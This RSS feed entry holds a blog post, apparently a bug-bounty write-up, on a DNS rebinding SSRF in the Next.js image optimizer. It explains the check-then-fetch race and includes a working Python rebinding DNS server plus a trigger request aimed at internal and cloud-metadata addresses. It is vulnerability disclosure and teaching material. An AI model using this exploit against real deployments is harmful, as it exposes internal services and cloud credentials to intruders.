<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on b1ue0cean's world</title><link>https://BestRun.github.io/posts/</link><description>b1ue0cean's world (Posts)</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 08 Sep 2026 22:53:23 +0200</lastBuildDate><atom:link href="https://BestRun.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Next.js DNS Rebinding SSRF</title><link>https://BestRun.github.io/posts/nextjs_ssrf/</link><pubDate>Tue, 08 Sep 2026 22:53:23 +0200</pubDate><guid>https://BestRun.github.io/posts/nextjs_ssrf/</guid><description>&lt;h2 id="nextjs-dns-rebinding-vulnerability" >Next.js DNS Rebinding Vulnerability
&lt;span>
&lt;a href="#nextjs-dns-rebinding-vulnerability">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Recently, I moved to CISPA Saarbrücken to work on my thesis. I chose to live close to the university, which means, once again, I ended up in a village.&lt;/p>
&lt;p>Living here is like a &amp;ldquo;修行&amp;rdquo; — no social life, just a handful of PhD friends. To keep myself entertained, I picked up an old hobby: bug bounty, for fun and for money.&lt;/p>
&lt;p>I put together a simple hunting pipeline and found an SSRF bug in Next.js. Turns out someone published a &lt;a href="https://seclists.org/fulldisclosure/2026/Sep/29">similar finding&lt;/a> just a few days before me. Timing is everything.&lt;/p>
&lt;p>With PhD and internship interviews coming up, I figured writing a few blog posts might help me quickly recall vulnerability hunting techniques when I need them most.&lt;/p>
&lt;hr>
&lt;h2 id="how-does-dns-lookup-work" >How Does DNS Lookup Work?
&lt;span>
&lt;a href="#how-does-dns-lookup-work">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>This is a bbbbb-basic question in any interview, but it&amp;rsquo;s worth spelling out because the attack below only makes sense if you understand the full resolution chain.&lt;/p>
&lt;p>The 8 steps in a DNS lookup:&lt;/p>
&lt;ol>
&lt;li>A user types &lt;code>example.com&lt;/code> into a browser. The query travels to a DNS recursive resolver.&lt;/li>
&lt;li>The resolver queries a DNS root nameserver (&lt;code>.&lt;/code>).&lt;/li>
&lt;li>The root server responds with the address of the Top Level Domain (TLD) nameserver (e.g. &lt;code>.com&lt;/code>).&lt;/li>
&lt;li>The resolver queries the &lt;code>.com&lt;/code> TLD nameserver.&lt;/li>
&lt;li>The TLD server responds with the address of the authoritative nameserver for &lt;code>example.com&lt;/code>.&lt;/li>
&lt;li>The resolver queries that authoritative nameserver.&lt;/li>
&lt;li>The authoritative nameserver returns the IP address for &lt;code>example.com&lt;/code>.&lt;/li>
&lt;li>The resolver passes the IP back to the browser. Done.&lt;/li>
&lt;/ol>
&lt;p>The critical detail: &lt;strong>whoever controls the authoritative nameserver for a domain controls what IP it resolves to&lt;/strong> — including private IPs like &lt;code>127.0.0.1&lt;/code>. The DNS protocol has no mechanism to prevent this. All defenses against it are built at the application layer.&lt;/p>
&lt;hr>
&lt;h2 id="the-vulnerability" >The Vulnerability
&lt;span>
&lt;a href="#the-vulnerability">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>The story starts at the &lt;a href="https://github.com/vercel/next.js/blob/afb0dbac6a0daeeca12d72759e51bd3493e16a0d/packages/next/src/server/image-optimizer.ts#L521">&lt;code>fetchExternalImage&lt;/code>&lt;/a> function. Next.js has an &lt;code>isPrivateIp&lt;/code> guard to block SSRF, and it even &lt;a href="https://github.com/vercel/next.js/blob/afb0dbac6a0daeeca12d72759e51bd3493e16a0d/packages/next/src/server/image-optimizer.ts#L580">applies this check recursively&lt;/a> through 302 redirects. Looks solid.&lt;/p>
&lt;p>But here&amp;rsquo;s the problem. Inside &lt;code>fetchExternalImage&lt;/code>, the code does:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Step 1: resolve the hostname and check the IP
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">records&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">lookup&lt;/span>(&lt;span style="color:#a6e22e">hostname&lt;/span>, { &lt;span style="color:#a6e22e">all&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span> }); &lt;span style="color:#75715e">// resolution T1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">records&lt;/span>.&lt;span style="color:#a6e22e">some&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span> =&amp;gt; &lt;span style="color:#a6e22e">isPrivateIp&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">address&lt;/span>))) &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Step 2: fetch the URL
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">fetch&lt;/span>(&lt;span style="color:#a6e22e">href&lt;/span>, { &lt;span style="color:#a6e22e">redirect&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;manual&amp;#39;&lt;/span> }); &lt;span style="color:#75715e">// resolution T2 (inside undici)
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>fetch()&lt;/code> is called with just the original &lt;code>href&lt;/code> string — no custom dispatcher, no IP pinning. That means undici resolves the hostname &lt;strong>again&lt;/strong>, completely independently. The IP that passed &lt;code>isPrivateIp&lt;/code> at T1 has nothing to do with the IP actually connected to at T2.&lt;/p>
&lt;p>This is a classic TOCTOU: &lt;strong>time of check, time of use&lt;/strong>.&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Time&lt;/th>
&lt;th>Action&lt;/th>
&lt;th>DNS Answer&lt;/th>
&lt;th>Result&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>T1&lt;/td>
&lt;td>&lt;code>lookup(hostname)&lt;/code> → isPrivateIp&lt;/td>
&lt;td>&lt;code>8.8.8.8&lt;/code> (public)&lt;/td>
&lt;td>✅ passes&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>T2&lt;/td>
&lt;td>&lt;code>fetch(hostname)&lt;/code> → undici resolves again&lt;/td>
&lt;td>&lt;code>127.0.0.1&lt;/code> (loopback)&lt;/td>
&lt;td>connects to internal service&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>To exploit this, an attacker registers a domain, points its NS record to their own server, and has that server return a public IP on the first DNS query and &lt;code>127.0.0.1&lt;/code> on the second. Setting TTL=0 ensures the recursive resolver never caches the first answer, so both queries hit the attacker&amp;rsquo;s server and get different responses.&lt;/p>
&lt;hr>
&lt;h2 id="poc" >PoC
&lt;span>
&lt;a href="#poc">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>The attacker runs an authoritative DNS server that flips its answer based on query count:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># pip install dnslib&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> dnslib &lt;span style="color:#f92672">import&lt;/span> RR, QTYPE, A
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> dnslib.server &lt;span style="color:#f92672">import&lt;/span> DNSServer, BaseResolver
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> threading
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>REBIND_DOMAIN &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;rebind.attacker.test.&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PUBLIC_IP &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;1.2.3.4&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>INTERNAL_IP &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;127.0.0.1&amp;#34;&lt;/span> &lt;span style="color:#75715e"># or 169.254.169.254&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">RebindResolver&lt;/span>(BaseResolver):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>seen &lt;span style="color:#f92672">=&lt;/span> {}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>lock &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Lock()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">resolve&lt;/span>(self, request, handler):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> client_ip &lt;span style="color:#f92672">=&lt;/span> handler&lt;span style="color:#f92672">.&lt;/span>client_address[&lt;span style="color:#ae81ff">0&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> qname &lt;span style="color:#f92672">=&lt;/span> str(request&lt;span style="color:#f92672">.&lt;/span>q&lt;span style="color:#f92672">.&lt;/span>qname)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> reply &lt;span style="color:#f92672">=&lt;/span> request&lt;span style="color:#f92672">.&lt;/span>reply()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> qname &lt;span style="color:#f92672">==&lt;/span> REBIND_DOMAIN &lt;span style="color:#f92672">and&lt;/span> request&lt;span style="color:#f92672">.&lt;/span>q&lt;span style="color:#f92672">.&lt;/span>qtype &lt;span style="color:#f92672">==&lt;/span> QTYPE&lt;span style="color:#f92672">.&lt;/span>A:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>lock:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>seen&lt;span style="color:#f92672">.&lt;/span>get(client_ip, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>seen[client_ip] &lt;span style="color:#f92672">=&lt;/span> n
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># query #1 → public IP (passes isPrivateIp)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># query #2+ → internal IP (where fetch actually connects)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#f92672">=&lt;/span> PUBLIC_IP &lt;span style="color:#66d9ef">if&lt;/span> n &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> INTERNAL_IP
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;[DNS] &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>client_ip&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> query #&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>n&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> -&amp;gt; &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>ip&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> reply&lt;span style="color:#f92672">.&lt;/span>add_answer(RR(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rname&lt;span style="color:#f92672">=&lt;/span>qname,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rtype&lt;span style="color:#f92672">=&lt;/span>QTYPE&lt;span style="color:#f92672">.&lt;/span>A,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rdata&lt;span style="color:#f92672">=&lt;/span>A(ip),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ttl&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#75715e"># no caching — every lookup hits this server&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> reply
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>server &lt;span style="color:#f92672">=&lt;/span> DNSServer(RebindResolver(), port&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">53&lt;/span>, address&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;0.0.0.0&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>server&lt;span style="color:#f92672">.&lt;/span>start_thread()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>input(&lt;span style="color:#e6db74">&amp;#34;Press Enter to stop...&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Trigger it by sending a request to the Next.js image optimizer with a URL pointing to your rebinding domain:&lt;/p>
&lt;pre tabindex="0">&lt;code>GET /_next/image?url=http%3A%2F%2Frebind.attacker.test%3A9099%2Flatest%2Fmeta-data%2F&amp;amp;w=64&amp;amp;q=75
&lt;/code>&lt;/pre>&lt;p>The optimizer calls &lt;code>lookup()&lt;/code> (T1, gets &lt;code>1.2.3.4&lt;/code>, passes the guard), then &lt;code>fetch()&lt;/code> (T2, undici resolves again, gets &lt;code>127.0.0.1&lt;/code>, connects to your internal service). You get a 200 back with the internal server&amp;rsquo;s content wrapped in a PNG response.&lt;/p>
